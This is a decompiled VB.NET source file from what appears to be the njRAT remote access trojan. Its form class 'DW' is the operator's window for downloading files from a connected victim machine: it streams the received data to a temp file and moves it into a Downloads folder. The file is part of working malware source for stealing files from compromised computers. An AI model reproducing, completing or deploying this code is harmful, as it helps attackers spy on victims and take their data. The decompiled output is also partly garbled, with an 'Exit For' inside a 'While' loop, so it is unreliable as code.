Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices

Namespace NJRAT
	' Token: 0x0200000D RID: 13
	<DesignerGenerated()>
	Public Partial Class DW
		Inherits Form

		' Token: 0x060001A6 RID: 422 RVA: 0x0001080C File Offset: 0x0000EA0C
		<DebuggerNonUserCode()>
		Private Shared Sub __ENCAddToList(value As Object)
			Dim _ENCList As List(Of WeakReference) = DW.__ENCList
			SyncLock _ENCList
				If DW.__ENCList.Count = DW.__ENCList.Capacity Then
					Dim num As Integer = 0
					Dim num2 As Integer = 0
					Dim num3 As Integer = DW.__ENCList.Count - 1
					Dim num4 As Integer = num2
					While True
						Dim num5 As Integer = num4
						Dim num6 As Integer = num3
						If num5 > num6 Then
							Exit For
						End If
						Dim weakReference As WeakReference = DW.__ENCList(num4)
						If weakReference.IsAlive Then
							If num4 <> num Then
								DW.__ENCList(num) = DW.__ENCList(num4)
							End If
							num += 1
						End If
						num4 += 1
					End While
					DW.__ENCList.RemoveRange(num, DW.__ENCList.Count - num)
					DW.__ENCList.Capacity = DW.__ENCList.Count
				End If
				DW.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
			End SyncLock
		End Sub

		' Token: 0x170000A0 RID: 160
		' (get) Token: 0x060001A9 RID: 425 RVA: 0x00011160 File Offset: 0x0000F360
		' (set) Token: 0x060001AA RID: 426 RVA: 0x00011178 File Offset: 0x0000F378
		Friend Overridable Property Timer1 As Timer
			<DebuggerNonUserCode()>
			Get
				Return Me._Timer1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer1_Tick
				If Me._Timer1 IsNot Nothing Then
					RemoveHandler Me._Timer1.Tick, value2
				End If
				Me._Timer1 = value
				If Me._Timer1 IsNot Nothing Then
					AddHandler Me._Timer1.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x170000A1 RID: 161
		' (get) Token: 0x060001AB RID: 427 RVA: 0x000111D0 File Offset: 0x0000F3D0
		' (set) Token: 0x060001AC RID: 428 RVA: 0x00002598 File Offset: 0x00000798
		Friend Overridable Property FormSkin1 As FormSkin
			<DebuggerNonUserCode()>
			Get
				Return Me._FormSkin1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As FormSkin)
				Me._FormSkin1 = value
			End Set
		End Property

		' Token: 0x170000A2 RID: 162
		' (get) Token: 0x060001AD RID: 429 RVA: 0x000111E8 File Offset: 0x0000F3E8
		' (set) Token: 0x060001AE RID: 430 RVA: 0x00011200 File Offset: 0x0000F400
		Friend Overridable Property Button1 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button1_Click
				If Me._Button1 IsNot Nothing Then
					RemoveHandler Me._Button1.Click, value2
				End If
				Me._Button1 = value
				If Me._Button1 IsNot Nothing Then
					AddHandler Me._Button1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000A3 RID: 163
		' (get) Token: 0x060001AF RID: 431 RVA: 0x00011258 File Offset: 0x0000F458
		' (set) Token: 0x060001B0 RID: 432 RVA: 0x000025A1 File Offset: 0x000007A1
		Friend Overridable Property ProgressBar1 As ProgressBar
			<DebuggerNonUserCode()>
			Get
				Return Me._ProgressBar1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ProgressBar)
				Me._ProgressBar1 = value
			End Set
		End Property

		' Token: 0x170000A4 RID: 164
		' (get) Token: 0x060001B1 RID: 433 RVA: 0x00011270 File Offset: 0x0000F470
		' (set) Token: 0x060001B2 RID: 434 RVA: 0x00011288 File Offset: 0x0000F488
		Friend Overridable Property FlatButton2 As FlatButton
			<DebuggerNonUserCode()>
			Get
				Return Me._FlatButton2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As FlatButton)
				Dim value2 As EventHandler = AddressOf Me.FlatButton2_Click
				If Me._FlatButton2 IsNot Nothing Then
					RemoveHandler Me._FlatButton2.Click, value2
				End If
				Me._FlatButton2 = value
				If Me._FlatButton2 IsNot Nothing Then
					AddHandler Me._FlatButton2.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000A5 RID: 165
		' (get) Token: 0x060001B3 RID: 435 RVA: 0x000112E0 File Offset: 0x0000F4E0
		' (set) Token: 0x060001B4 RID: 436 RVA: 0x000025AA File Offset: 0x000007AA
		Friend Overridable Property FlatMini1 As FlatMini
			<DebuggerNonUserCode()>
			Get
				Return Me._FlatMini1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As FlatMini)
				Me._FlatMini1 = value
			End Set
		End Property

		' Token: 0x170000A6 RID: 166
		' (get) Token: 0x060001B5 RID: 437 RVA: 0x000112F8 File Offset: 0x0000F4F8
		' (set) Token: 0x060001B6 RID: 438 RVA: 0x000025B3 File Offset: 0x000007B3
		Friend Overridable Property FlatGroupBox1 As FlatGroupBox
			<DebuggerNonUserCode()>
			Get
				Return Me._FlatGroupBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As FlatGroupBox)
				Me._FlatGroupBox1 = value
			End Set
		End Property

		' Token: 0x170000A7 RID: 167
		' (get) Token: 0x060001B7 RID: 439 RVA: 0x00011310 File Offset: 0x0000F510
		' (set) Token: 0x060001B8 RID: 440 RVA: 0x00011328 File Offset: 0x0000F528
		Friend Overridable Property Lv1 As GClass9
			<DebuggerNonUserCode()>
			Get
				Return Me._Lv1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GClass9)
				Dim value2 As EventHandler = AddressOf Me.Lv1_SelectedIndexChanged
				If Me._Lv1 IsNot Nothing Then
					RemoveHandler Me._Lv1.SelectedIndexChanged, value2
				End If
				Me._Lv1 = value
				If Me._Lv1 IsNot Nothing Then
					AddHandler Me._Lv1.SelectedIndexChanged, value2
				End If
			End Set
		End Property

		' Token: 0x170000A8 RID: 168
		' (get) Token: 0x060001B9 RID: 441 RVA: 0x00011380 File Offset: 0x0000F580
		' (set) Token: 0x060001BA RID: 442 RVA: 0x000025BC File Offset: 0x000007BC
		Friend Overridable Property ColumnHeader1 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader1 = value
			End Set
		End Property

		' Token: 0x170000A9 RID: 169
		' (get) Token: 0x060001BB RID: 443 RVA: 0x00011398 File Offset: 0x0000F598
		' (set) Token: 0x060001BC RID: 444 RVA: 0x000025C5 File Offset: 0x000007C5
		Friend Overridable Property ColumnHeader2 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader2 = value
			End Set
		End Property

		' Token: 0x060001BD RID: 445 RVA: 0x000113B0 File Offset: 0x0000F5B0
		Public Sub New()
			AddHandler MyBase.FormClosing, AddressOf Me.DW_FormClosing
			AddHandler MyBase.Load, AddressOf Me.DW_Load
			DW.__ENCAddToList(Me)
			Me.os = 0
			Me.InitializeComponent()
		End Sub

		' Token: 0x060001BE RID: 446 RVA: 0x000113FC File Offset: 0x0000F5FC
		Private Sub DW_FormClosing(sender As Object, e As FormClosingEventArgs)
			Try
				Me.FS.Close()
			Catch ex As Exception
			End Try
			Try
				Me.FS.Dispose()
			Catch ex2 As Exception
			End Try
			Try
				File.Delete(Me.tmp)
			Catch ex3 As Exception
			End Try
			Me.Button1.Enabled = False
			Me.c.CN = False
		End Sub

		' Token: 0x060001BF RID: 447 RVA: 0x000114A0 File Offset: 0x0000F6A0
		Private Sub DW_Load(sender As Object, e As EventArgs)
			Me.Text = Conversions.ToString(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Class7.smethod_1(Me.osk.L)), " - ")), Class6.smethod_16(Me.FN))))
			Me.ProgressBar1.Maximum = Me.SZ
			Me.folder = Me.osk.Folder + "Downloads\"
			If Not Directory.Exists(Me.folder) Then
				Directory.CreateDirectory(Me.folder)
			End If
			Me.folder += New FileInfo(Class6.smethod_16(Me.FN)).Name
			Me.Lv1.Items(0).SubItems(0).Text = New FileInfo(Class6.smethod_16(Me.FN)).Name
			Me.Lv1.Items(1).SubItems(0).Text = Class6.smethod_17(CLng(Me.SZ))
			Do
				Me.tmp = Interaction.Environ("temp") + "\njfm_" + Class6.smethod_6(10)
			Loop While File.Exists(Me.tmp)
			Me.FS = New FileStream(Me.tmp, FileMode.Append)
			Me.Lv1.Items(2).SubItems(0).Text = Class6.smethod_17(CLng((Me.ProgressBar1.Value - Me.os)))
			Me.os = Me.ProgressBar1.Value
			Me.Lv1.Items(3).SubItems(0).Text = Class6.smethod_17(CLng(Me.ProgressBar1.Value))
			Me.Lv1.method_3()
			Me.Timer1.Enabled = True
		End Sub

		' Token: 0x060001C0 RID: 448 RVA: 0x00011698 File Offset: 0x0000F898
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Try
				Me.Lv1.Items(2).SubItems(1).Text = Class6.smethod_17(CLng((Me.ProgressBar1.Value - Me.os)))
				Me.os = Me.ProgressBar1.Value
				Me.Lv1.Items(3).SubItems(1).Text = Class6.smethod_17(CLng(Me.ProgressBar1.Value))
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060001C1 RID: 449 RVA: 0x00002199 File Offset: 0x00000399
		Private Sub FlatButton2_Click(sender As Object, e As EventArgs)
			Me.Close()
		End Sub

		' Token: 0x060001C2 RID: 450 RVA: 0x00011744 File Offset: 0x0000F944
		Private Sub Button1_Click(sender As Object, e As EventArgs)
			If Operators.CompareString(Me.Button1.Text, "Stop", False) = 0 Then
				Me.FS.Close()
				Me.FS.Dispose()
				File.Delete(Me.tmp)
				Me.Button1.Enabled = False
				Me.c.CN = False
				Me.Close()
			Else
				Me.FS.Close()
				Me.FS.Dispose()
				File.Move(Me.tmp, Me.folder)
			End If
		End Sub

		' Token: 0x060001C3 RID: 451 RVA: 0x00002050 File Offset: 0x00000250
		Private Sub Lv1_SelectedIndexChanged(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x040000B9 RID: 185
		Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

		' Token: 0x040000BB RID: 187
		<AccessedThroughProperty("Timer1")>
		Private _Timer1 As Timer

		' Token: 0x040000BC RID: 188
		<AccessedThroughProperty("FormSkin1")>
		Private _FormSkin1 As FormSkin

		' Token: 0x040000BD RID: 189
		<AccessedThroughProperty("Button1")>
		Private _Button1 As Button

		' Token: 0x040000BE RID: 190
		<AccessedThroughProperty("ProgressBar1")>
		Private _ProgressBar1 As ProgressBar

		' Token: 0x040000BF RID: 191
		<AccessedThroughProperty("FlatButton2")>
		Private _FlatButton2 As FlatButton

		' Token: 0x040000C0 RID: 192
		<AccessedThroughProperty("FlatMini1")>
		Private _FlatMini1 As FlatMini

		' Token: 0x040000C1 RID: 193
		<AccessedThroughProperty("FlatGroupBox1")>
		Private _FlatGroupBox1 As FlatGroupBox

		' Token: 0x040000C2 RID: 194
		<AccessedThroughProperty("Lv1")>
		Private _Lv1 As GClass9

		' Token: 0x040000C3 RID: 195
		<AccessedThroughProperty("ColumnHeader1")>
		Private _ColumnHeader1 As ColumnHeader

		' Token: 0x040000C4 RID: 196
		<AccessedThroughProperty("ColumnHeader2")>
		Private _ColumnHeader2 As ColumnHeader

		' Token: 0x040000C5 RID: 197
		Public c As Client

		' Token: 0x040000C6 RID: 198
		Public FN As String

		' Token: 0x040000C7 RID: 199
		Public folder As String

		' Token: 0x040000C8 RID: 200
		Public FS As FileStream

		' Token: 0x040000C9 RID: 201
		Public os As Integer

		' Token: 0x040000CA RID: 202
		Public osk As Client

		' Token: 0x040000CB RID: 203
		Public SZ As Integer

		' Token: 0x040000CC RID: 204
		Public tmp As String
	End Class
End Namespace
